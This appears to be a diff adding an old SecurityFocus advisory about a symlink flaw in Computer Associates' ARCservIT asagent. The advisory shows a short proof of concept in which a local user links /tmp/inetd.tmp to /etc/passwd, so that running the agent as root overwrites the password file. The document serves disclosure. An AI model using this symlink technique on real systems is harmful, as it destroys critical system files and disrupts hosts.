@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/2748/info
+
+ARCservIT from Computer Associates contains a vulnerability which may allow malicious local users to corrupt arbitrary files.
+
+When it runs with the parameters 'inet add', 'asagent', opens (and overwrites it if it exists) a file in /tmp called 'inetd.tmp'. 'asagent' does not check to make sure that this file already exists or that is a symbolic link to another file.
+
+This may allow malicious local users to corrupt critical system files. 
+
+je@boxname~> ln -s /etc/passwd /tmp/inetd.tmp
+
+And root:
+
+root@boxname# /usr/CYEagent/asagent inet add
+
+Then,
+
+je@boxname~> cat /etc/passwd
+asagentd 6051/tcp # ARCserve agent
+asagentd 6051/udp # ARCserve agent 
